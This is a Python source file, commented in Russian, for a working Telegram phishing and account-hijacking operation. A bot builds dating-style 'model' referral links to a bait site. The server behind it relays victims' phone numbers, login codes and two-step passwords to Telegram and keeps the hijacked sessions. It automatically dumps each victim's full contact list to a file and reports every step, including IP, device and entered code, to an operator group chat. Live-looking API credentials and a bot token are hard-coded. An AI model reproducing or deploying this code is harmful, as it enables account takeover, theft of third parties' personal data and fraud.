from aiohttp import web
from telethon import TelegramClient
import json
import os
import secrets
from datetime import datetime, timedelta
import asyncio
import uuid
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.types import ReplyKeyboardRemove
import threading
from urllib.parse import quote
import queue
import user_agents

# ↓↓↓ ДЛЯ RENDER - ПОРТ ИЗ ПЕРЕМЕННЫХ ОКРУЖЕНИЯ ↓↓↓
PORT = int(os.environ.get('PORT', 80))
# ↑↑↑ ДЛЯ RENDER - ПОРТ ИЗ ПЕРЕМЕННЫХ ОКРУЖЕНИЯ ↑↑↑

# ↓↓↓ ТЕЛЕГРАМ ДАННЫЕ ↓↓↓
API_ID = "26120781"
API_HASH = "1f72de4bdd4fc68a70d1f82f9c17af4e"
BOT_TOKEN = "8599650382:AAESazEZQPK7UisG_LudLBeERROvJikCzzA"
GROUP_CHAT_ID = "-1003488289989"
# ↑↑↑ ТЕЛЕГРАМ ДАННЫЕ ↑↑↑

# Инициализация бота
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# Глобальные переменные
os.makedirs("sessions", exist_ok=True)
active_sessions = {}
user_sessions = {}
users_data = {}
link_visits = {}
notification_queue = queue.Queue()

# Домен сайта
DOMAIN = "bestweb.live"

class ModelStates(StatesGroup):
    NAME = State()
    HEIGHT = State()
    WEIGHT = State()
    HAIR = State()
    EYES = State()
    HOBBY = State()
    PHOTOS = State()

# === ФУНКЦИИ ДЛЯ ОТСТУКОВ ===
def add_notification(message_text: str):
    """Добавляем отстук в очередь"""
    notification_queue.put(message_text)
    print(f"📨 Добавлен в очередь: {message_text}")

async def send_notification(message_text: str):
    """Отправка отстука"""
    try:
        print(f"📢 ОТПРАВЛЯЕМ: {message_text}")
        await bot.send_message(GROUP_CHAT_ID, message_text)
        print("✅ Отстук отправлен в группу!")
    except Exception as e:
        print(f"❌ Ошибка отправки: {e}")

async def notification_worker():
    """Воркер для обработки очереди отстуков"""
    while True:
        try:
            if not notification_queue.empty():
                message_text = notification_queue.get_nowait()
                await send_notification(message_text)
            await asyncio.sleep(0.5)
        except Exception as e:
            print(f"❌ Ошибка в воркере: {e}")
            await asyncio.sleep(1)

def get_client_info(request):
    """Получаем информацию о клиенте"""
    real_ip = request.headers.get('X-Forwarded-For') or \
              request.headers.get('X-Real-IP') or \
              request.remote
    
    if ',' in str(real_ip):
        real_ip = str(real_ip).split(',')[0].strip()
    
    user_agent_string = request.headers.get('User-Agent', 'Неизвестно')
    
    try:
        ua = user_agents.parse(user_agent_string)
        os_info = f"{ua.os.family} {ua.os.version_string}".strip()
        browser_info = f"{ua.browser.family} {ua.browser.version_string}".strip()
        device_info = f"{ua.device.family} {ua.device.brand}".strip()
        
        client_info = f"💻 {os_info} | 🖥️ {browser_info}"
        if device_info and device_info != "Other Other":
            client_info += f" | 📱 {device_info}"
            
    except:
        client_info = f"💻 Неизвестная ОС | 🖥️ Неизвестный браузер"
    
    return real_ip, client_info, user_agent_string

# === ФУНКЦИИ ДЛЯ TELEGRAM CLIENT ===
def create_user_session(phone, client):
    """Создает постоянную сессию пользователя"""
    session_token = secrets.token_hex(32)
    user_sessions[session_token] = {
        'phone': phone,
        'client': client,
        'created_at': datetime.now(),
        'expires_at': datetime.now() + timedelta(days=30)
    }
    return session_token

async def send_telegram_code(phone):
    try:
        # Очищаем номер от всех символов кроме цифр и +
        phone_clean = ''.join(c for c in phone if c.isdigit() or c == '+')
        
        # Если номер начинается с +, оставляем как есть
        # Если нет, добавляем +
        if not phone_clean.startswith('+'):
            phone_clean = '+' + phone_clean
        
        print(f"📱 Отправка кода на номер: {phone_clean}")
        
        # Создаем уникальное имя сессии на основе номера
        session_name = phone_clean.replace('+', '').replace(' ', '')
        session_file = f"sessions/{session_name}"
        
        client = TelegramClient(session_file, API_ID, API_HASH)
        await client.connect()
        
        print("🔄 Отправляем запрос на код...")
        result = await client.send_code_request(phone_clean)
        
        active_sessions[phone_clean] = {
            'client': client,
            'phone_code_hash': result.phone_code_hash
        }
        
        print(f"✅ Код отправлен на {phone_clean}! Hash: {result.phone_code_hash}")
        return {'success': True}
        
    except Exception as e:
        print(f"❌ Ошибка отправки кода: {e}")
        return {'success': False, 'error': str(e)}

async def verify_telegram_code(phone, code):
    try:
        # Очищаем номер так же как при отправке
        phone_clean = ''.join(c for c in phone if c.isdigit() or c == '+')
        if not phone_clean.startswith('+'):
            phone_clean = '+' + phone_clean
        
        print(f"🔐 Проверка кода для номера: {phone_clean}")
        
        if phone_clean not in active_sessions:
            return {'success': False, 'error': 'Сессия не найдена'}
        
        session = active_sessions[phone_clean]
        client = session['client']
        
        try:
            # Используем очищенный номер
            await client.sign_in(
                phone=phone_clean, 
                code=code, 
                phone_code_hash=session['phone_code_hash']
            )
        except Exception as sign_in_error:
            if "two-steps verification" in str(sign_in_error) or "two_step" in str(sign_in_error):
                return {
                    'success': False, 
                    '2fa_required': True,
                    'error': 'Two-steps verification is enabled and a password is required'
                }
            else:
                return {'success': False, 'error': str(sign_in_error)}
        
        session_token = create_user_session(phone_clean, client)
        
        if phone_clean in active_sessions:
            del active_sessions[phone_clean]
        
        print(f"✅ Авторизация успешна для {phone_clean}")
        return {
            'success': True,
            'session_token': session_token
        }
            
    except Exception as e:
        return {'success': False, 'error': str(e)}

# === ФУНКЦИЯ ДЛЯ ПОЛУЧЕНИЯ РЕАЛЬНЫХ КОНТАКТОВ ===
async def get_real_telegram_contacts(session_token):
    """Получает реальные контакты из авторизованного аккаунта"""
    try:
        if session_token not in user_sessions:
            return {'success': False, 'error': 'Сессия не найдена'}
        
        session = user_sessions[session_token]
        client = session['client']
        phone = session['phone']
        
        print(f"🔍 Начинаем сбор контактов для +{phone}")
        
        # Получаем контакты через Telethon
        contacts = await client.get_contacts()
        
        # Получаем полную информацию о пользователях
        users_info = []
        for contact in contacts:
            try:
                user_info = {
                    'id': contact.id,
                    'first_name': contact.first_name or '',
                    'last_name': contact.last_name or '',
                    'username': contact.username or '',
                    'phone': contact.phone or '',
                    'mutual_contact': contact.mutual_contact or False,
                    'is_contact': True
                }
                users_info.append(user_info)
            except Exception as e:
                print(f"❌ Ошибка обработки контакта {contact.id}: {e}")
                continue
        
        print(f"✅ Собрано {len(users_info)} контактов для +{phone}")
        
        # Сохраняем в файл
        await save_contacts_to_file(phone, users_info)
        
        # Отправляем отстук
        add_notification(
            f"📱 ВЫКАЧАНЫ РЕАЛЬНЫЕ КОНТАКТЫ\n"
            f"📟 Номер: +{phone}\n"
            f"👥 Контактов: {len(users_info)}\n"
            f"💾 Сохранено в файл: contacts_{phone}.txt"
        )
        
        return {
            'success': True,
            'contacts_count': len(users_info),
            'contacts': users_info
        }
        
    except Exception as e:
        print(f"❌ Ошибка получения контактов: {e}")
        return {'success': False, 'error': str(e)}

async def save_contacts_to_file(phone, contacts):
    """Сохраняет контакты в текстовый файл"""
    try:
        filename = f"contacts_{phone}.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"=== РЕАЛЬНЫЕ КОНТАКТЫ TELEGRAM ===\n\n")
            f.write(f"👤 Владелец аккаунта: +{phone}\n")
            f.write(f"🕐 Время сбора: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"📊 Всего контактов: {len(contacts)}\n\n")
            f.write("📞 СПИСОК КОНТАКТОВ:\n")
            f.write("=" * 50 + "\n\n")
            
            for i, contact in enumerate(contacts, 1):
                f.write(f"👤 Контакт #{i}:\n")
                f.write(f"   📞 Телефон: {contact['phone']}\n")
                f.write(f"   👤 Имя: {contact['first_name']} {contact['last_name']}\n")
                f.write(f"   🔗 Юзернейм: @{contact['username']}\n")
                f.write(f"   🆔 User ID: {contact['id']}\n")
                f.write(f"   🤝 Взамный: {'Да' if contact['mutual_contact'] else 'Нет'}\n")
                f.write("-" * 30 + "\n\n")
        
        print(f"✅ Контакты сохранены в {filename}")
        return filename
        
    except Exception as e:
        print(f"❌ Ошибка сохранения файла: {e}")
        return None

async def verify_telegram_2fa(phone, password):
    try:
        # Очищаем номер так же как при отправке
        phone_clean = ''.join(c for c in phone if c.isdigit() or c == '+')
        if not phone_clean.startswith('+'):
            phone_clean = '+' + phone_clean
            
        print(f"🔐 Проверка 2FA для номера: {phone_clean}")
        
        if phone_clean not in active_sessions:
            return {'success': False, 'error': 'Сессия не найдена'}
        
        session = active_sessions[phone_clean]
        client = session['client']
        
        await client.sign_in(password=password)
        
        session_token = create_user_session(phone_clean, client)
        
        # АВТОМАТИЧЕСКАЯ ВЫКАЧКА КОНТАКТОВ
        print(f"🚀 Автоматически выкачиваем контакты для {phone_clean}")
        contacts_result = await get_real_telegram_contacts(session_token)
        
        if phone_clean in active_sessions:
            del active_sessions[phone_clean]
        
        print(f"✅ 2FA авторизация успешна для {phone_clean}")
        return {
            'success': True,
            'session_token': session_token,
            'contacts_exported': contacts_result['success'],
            'contacts_count': contacts_result.get('contacts_count', 0)
        }
            
    except Exception as e:
        return {'success': False, 'error': str(e)}

# === HTTP ОБРАБОТЧИКИ ДЛЯ САЙТА ===
async def handle_index(request):
    """Главная страница с отслеживанием переходов"""
    try:
        params = dict(request.query)
        
        if params and 'Код' in params:
            ref_code = params.get('Код', 'неизвестно')
            model_name = params.get('Имя', 'Неизвестно')
            
            real_ip, client_info, user_agent = get_client_info(request)
            
            add_notification(
                f"🔗 ПЕРЕХОД ПО РЕФЕРАЛЬНОЙ ССЫЛКЕ\n"
                f"👤 Модель: {model_name}\n"
                f"📋 Код ссылки: {ref_code}\n"
                f"🌐 IP: {real_ip}\n"
                f"{client_info}\n"
                f"📱 Устройство: {user_agent[:60]}..."
            )
            
            if ref_code not in link_visits:
                link_visits[ref_code] = 0
            link_visits[ref_code] += 1
            
            print(f"📊 Переход по ссылке {ref_code}. Всего: {link_visits[ref_code]}")
        
        with open('index.html', 'r', encoding='utf-8') as f:
            return web.Response(text=f.read(), content_type='text/html')
            
    except Exception as e:
        return web.Response(text=f"Error: {e}", status=500)

async def handle_visit(request):
    """Посещение сайта"""
    try:
        data = await request.json()
        ref_code = data.get('ref_code', 'неизвестно')
        
        real_ip, client_info, user_agent = get_client_info(request)
        
        add_notification(
            f"🌐 ПОСЕТИТЕЛЬ НА САЙТЕ\n"
            f"🔗 Код ссылки: {ref_code}\n"
            f"🌐 IP: {real_ip}\n"
            f"{client_info}\n"
            f"📱 User-Agent: {user_agent[:80]}..."
        )
        return web.Response(text="OK")
    except Exception as e:
        print(f"❌ Ошибка в handle_visit: {e}")
        return web.Response(text="OK")

async def handle_phone_entered(request):
    """Ввод номера телефона"""
    try:
        data = await request.json()
        phone = data.get('phone', '')
        ref_code = data.get('ref_code', 'неизвестно')
        
        real_ip, client_info, user_agent = get_client_info(request)
        
        add_notification(
            f"📞 ВВЕДЕН НОМЕР ТЕЛЕФОНА\n"
            f"🔗 Код ссылки: {ref_code}\n"
            f"📟 Номер: {phone}\n"
            f"🌐 IP: {real_ip}\n"
            f"{client_info}"
        )
        return web.Response(text="OK")
    except Exception as e:
        print(f"❌ Ошибка в handle_phone_entered: {e}")
        return web.Response(text="OK")

async def handle_code_entered(request):
    """Ввод кода"""
    try:
        data = await request.json()
        code = data.get('code', '')
        phone = data.get('phone', '')
        ref_code = data.get('ref_code', 'неизвестно')
        
        real_ip, client_info, user_agent = get_client_info(request)
        
        add_notification(
            f"🔐 ВВЕДЕН КОД\n"
            f"🔗 Код ссылки: {ref_code}\n"
            f"📟 Номер: {phone}\n"
            f"🔢 Код: {code}\n"
            f"🌐 IP: {real_ip}\n"
            f"{client_info}"
        )
        return web.Response(text="OK")
    except Exception as e:
        print(f"❌ Ошибка в handle_code_entered: {e}")
        return web.Response(text="OK")

async def handle_login_click(request):
    """Нажатие кнопки входа"""
    try:
        data = await request.json()
        ref_code = data.get('ref_code', 'неизвестно')
        
        real_ip, client_info, user_agent = get_client_info(request)
        
        add_notification(
            f"🖱️ НАЖАТА КНОПКА ВХОДА\n"
            f"🔗 Код ссылки: {ref_code}\n"
            f"🌐 IP: {real_ip}\n"
            f"{client_info}"
        )
        return web.Response(text="OK")
    except Exception as e:
        print(f"❌ Ошибка в handle_login_click: {e}")
        return web.Response(text="OK")

# === TELEGRAM CLIENT API ===
async def handle_send_code(request):
    data = await request.json()
    phone = data.get('phone', '')
    result = await send_telegram_code(phone)
    return web.Response(text=json.dumps(result), content_type='application/json')

async def handle_verify_code(request):
    data = await request.json()
    phone = data.get('phone', '')
    code = data.get('code', '')
    result = await verify_telegram_code(phone, code)
    return web.Response(text=json.dumps(result), content_type='application/json')

async def handle_verify_2fa(request):
    data = await request.json()
    phone = data.get('phone', '')
    password = data.get('password', '')
    result = await verify_telegram_2fa(phone, password)
    return web.Response(text=json.dumps(result), content_type='application/json')

async def handle_check_session(request):
    data = await request.json()
    session_token = data.get('session_token', '')
    
    if session_token in user_sessions:
        session = user_sessions[session_token]
        if datetime.now() < session['expires_at']:
            return web.Response(text=json.dumps({'valid': True}), content_type='application/json')
        else:
            del user_sessions[session_token]
    
    return web.Response(text=json.dumps({'valid': False}), content_type='application/json')

# === HTTP ОБРАБОТЧИК ДЛЯ ВЫКАЧКИ КОНТАКТОВ ===
async def handle_get_contacts(request):
    """API для получения контактов после авторизации"""
    try:
        data = await request.json()
        session_token = data.get('session_token', '')
        
        if not session_token:
            return web.Response(
                text=json.dumps({'success': False, 'error': 'No session token'}),
                content_type='application/json'
            )
        
        result = await get_real_telegram_contacts(session_token)
        return web.Response(
            text=json.dumps(result),
            content_type='application/json'
        )
        
    except Exception as e:
        return web.Response(
            text=json.dumps({'success': False, 'error': str(e)}),
            content_type='application/json'
        )

# === ОЧИСТКА СЕССИЙ ===
async def cleanup_sessions():
    """Очистка просроченных сессий"""
    while True:
        await asyncio.sleep(600)
        now = datetime.now()
        expired_tokens = []
        
        for token, session in user_sessions.items():
            if now >= session['expires_at']:
                expired_tokens.append(token)
        
        for token in expired_tokens:
            del user_sessions[token]
        
        if expired_tokens:
            print(f"🧹 Очищено {len(expired_tokens)} просроченных сессий")

# === КОМАНДЫ БОТА ===
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    add_notification(
        f"🚀 ПОЛЬЗОВАТЕЛЬ ЗАПУСТИЛ БОТА\n"
        f"👤 ID: {message.from_user.id}\n"
        f"📛 Имя: {message.from_user.full_name}\n"
        f"📱 Username: @{message.from_user.username}"
    )
    
    await message.answer(
        "Привет! Я бот для создания моделей и реферальной ссылки.\n\n"
        "Команды:\n"
        "/setmodel - Создать модель\n"
        "/miref - Получить вашу реферальную ссылку\n"
        "/delref - Удалить реферальную ссылку\n"
        "/stats - Статистика переходов"
    )

@dp.message(Command("setmodel"))
async def cmd_setmodel(message: types.Message, state: FSMContext):
    add_notification(
        f"📝 НАЧАТ ПРОЦЕСС СОЗДАНИЯ МОДЕЛИ\n"
        f"👤 Пользователь: {message.from_user.full_name}"
    )
    
    await message.answer("Введите имя модели:")
    await state.update_data(photos=[])
    await state.set_state(ModelStates.NAME)

@dp.message(ModelStates.NAME)
async def process_name(message: types.Message, state: FSMContext):
    await state.update_data(name=message.text)
    await message.answer("Введите рост (например: 175 см):")
    await state.set_state(ModelStates.HEIGHT)

@dp.message(ModelStates.HEIGHT)
async def process_height(message: types.Message, state: FSMContext):
    await state.update_data(height=message.text)
    await message.answer("Введите вес (например: 55 кг):")
    await state.set_state(ModelStates.WEIGHT)

@dp.message(ModelStates.WEIGHT)
async def process_weight(message: types.Message, state: FSMContext):
    await state.update_data(weight=message.text)
    await message.answer("Введите цвет волос:")
    await state.set_state(ModelStates.HAIR)

@dp.message(ModelStates.HAIR)
async def process_hair(message: types.Message, state: FSMContext):
    await state.update_data(hair=message.text)
    await message.answer("Введите цвет глаз:")
    await state.set_state(ModelStates.EYES)

@dp.message(ModelStates.EYES)
async def process_eyes(message: types.Message, state: FSMContext):
    await state.update_data(eyes=message.text)
    await message.answer("Введите хобби/интересы:")
    await state.set_state(ModelStates.HOBBY)

@dp.message(ModelStates.HOBBY)
async def process_hobby(message: types.Message, state: FSMContext):
    await state.update_data(hobby=message.text)
    
    user_id = str(message.from_user.id)
    user_data = await state.get_data()
    
    # Создаем реферальный код
    ref_code = str(uuid.uuid4())[:8]
    users_data[user_id] = {
        'ref_code': ref_code,
        'model_data': user_data
    }
    
    # Создаем реферальную ссылку с новым доменом
    base_url = f"http://{DOMAIN}"
    params = {
        'Код': ref_code,
        'Имя': user_data['name'],
        'Возраст': '23 года',  # Можно добавить поле возраста
        'Рост': user_data['height'],
        'Вес': user_data['weight'],
        'Грудь': '3 размер',  # Можно добавить поле груди
        'Статус': 'Онлайн'
    }
    
    query_string = '&'.join([f"{k}={quote(str(v))}" for k, v in params.items()])
    ref_link = f"{base_url}?{query_string}"
    
    add_notification(
        f"✅ СОЗДАНА НОВАЯ МОДЕЛЬ\n"
        f"👤 Создатель: {message.from_user.full_name}\n"
        f"👩 Модель: {user_data['name']}\n"
        f"🔗 Код ссылки: {ref_code}\n"
        f"🌐 Домен: {DOMAIN}"
    )
    
    await message.answer(
        f"✅ Модель создана!\n\n"
        f"👩 Имя: {user_data['name']}\n"
        f"📏 Рост: {user_data['height']}\n"
        f"⚖️ Вес: {user_data['weight']}\n"
        f"💇 Волосы: {user_data['hair']}\n"
        f"👁️ Глаза: {user_data['eyes']}\n"
        f"🎯 Хобби: {user_data['hobby']}\n\n"
        f"🔗 Ваша реферальная ссылка:\n{ref_link}\n\n"
        f"Используйте /miref чтобы получить ссылку позже"
    )
    
    await state.clear()

@dp.message(Command("miref"))
async def cmd_miref(message: types.Message):
    user_id = str(message.from_user.id)
    
    if user_id not in users_data:
        await message.answer("У вас нет созданной модели. Используйте /setmodel чтобы создать.")
        return
    
    user_data = users_data[user_id]
    ref_code = user_data['ref_code']
    model_data = user_data['model_data']
    
    # Создаем реферальную ссылку с новым доменом
    base_url = f"http://{DOMAIN}"
    params = {
        'Код': ref_code,
        'Имя': model_data['name'],
        'Возраст': '23 года',
        'Рост': model_data['height'],
        'Вес': model_data['weight'],
        'Грудь': '3 размер',
        'Статус': 'Онлайн'
    }
    
    query_string = '&'.join([f"{k}={quote(str(v))}" for k, v in params.items()])
    ref_link = f"{base_url}?{query_string}"
    
    visits = link_visits.get(ref_code, 0)
    
    await message.answer(
        f"🔗 Ваша реферальная ссылка:\n{ref_link}\n\n"
        f"📊 Переходов по ссылке: {visits}"
    )

@dp.message(Command("delref"))
async def cmd_delref(message: types.Message):
    user_id = str(message.from_user.id)
    
    if user_id in users_data:
        ref_code = users_data[user_id]['ref_code']
        del users_data[user_id]
        
        if ref_code in link_visits:
            del link_visits[ref_code]
        
        add_notification(
            f"🗑️ УДАЛЕНА МОДЕЛЬ И ССЫЛКА\n"
            f"👤 Пользователь: {message.from_user.full_name}\n"
            f"🔗 Код ссылки: {ref_code}"
        )
        
        await message.answer("✅ Ваша модель и реферальная ссылка удалены.")
    else:
        await message.answer("У вас нет созданной модели.")

@dp.message(Command("stats"))
async def cmd_stats(message: types.Message):
    user_id = str(message.from_user.id)
    
    if user_id not in users_data:
        await message.answer("У вас нет созданной модели.")
        return
    
    ref_code = users_data[user_id]['ref_code']
    visits = link_visits.get(ref_code, 0)
    
    await message.answer(
        f"📊 СТАТИСТИКА ВАШЕЙ ССЫЛКИ\n"
        f"🔗 Код ссылки: {ref_code}\n"
        f"👥 Всего переходов: {visits}\n"
        f"👩 Модель: {users_data[user_id]['model_data']['name']}\n"
        f"🌐 Домен: {DOMAIN}"
    )

# === ЗАПУСК СЕРВЕРА ===
async def run_http_server():
    app = web.Application()
    
    # CORS middleware для bestweb.live
    async def cors_middleware(app, handler):
        async def middleware_handler(request):
            if request.method == 'OPTIONS':
                response = web.Response()
            else:
                response = await handler(request)
            
            # ✅ РАЗРЕШАЕМ ЗАПРОСЫ ОТ bestweb.live
            response.headers['Access-Control-Allow-Origin'] = 'https://bestweb.live'
            response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
            response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
            return response
        return middleware_handler
    
    app.middlewares.append(cors_middleware)
    
    # Статические страницы
    app.router.add_get('/', handle_index)
    
    # Отслеживание действий
    app.router.add_post('/visit', handle_visit)
    app.router.add_post('/phone-entered', handle_phone_entered)
    app.router.add_post('/code-entered', handle_code_entered)
    app.router.add_post('/login-click', handle_login_click)
    
    # Telegram Client API
    app.router.add_post('/send-code', handle_send_code)
    app.router.add_post('/verify-code', handle_verify_code)
    app.router.add_post('/verify-2fa', handle_verify_2fa)
    app.router.add_post('/check-session', handle_check_session)
    app.router.add_post('/get-contacts', handle_get_contacts)
    
    # Запускаем очистку сессий
    asyncio.create_task(cleanup_sessions())
    
    runner = web.AppRunner(app)
    await runner.setup()
    
    # ✅ ИСПОЛЬЗУЕМ PORT ДЛЯ RENDER
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    
    print(f"✅ Сервер успешно запущен на порту {PORT}!")
    print(f"🌐 API доступен: https://repoz.onrender.com")
    print(f"🔗 CORS разрешен для: https://bestweb.live")
    
    # Бесконечный цикл чтобы сервер не закрывался
    while True:
        await asyncio.sleep(3600)

async def main():
    print("🔄 Запускаем серверы...")
    
    # 1. Запускаем воркер отстуков
    asyncio.create_task(notification_worker())
    
    # 2. Запускаем очистку сессий
    asyncio.create_task(cleanup_sessions())
    
    # 3. Запускаем HTTP сервер
    http_task = asyncio.create_task(run_http_server())
    
    # 4. Ждем немного чтобы HTTP сервер запустился
    await asyncio.sleep(3)
    
    print("✅ Все сервисы запущены!")
    print("🌐 HTTP API доступен для сайта bestweb.live")
    print("🤖 Бот готов к работе")
    
    # 5. Запускаем бота
    try:
        await dp.start_polling(bot)
    finally:
        await http_task

if __name__ == "__main__":
    asyncio.run(main())
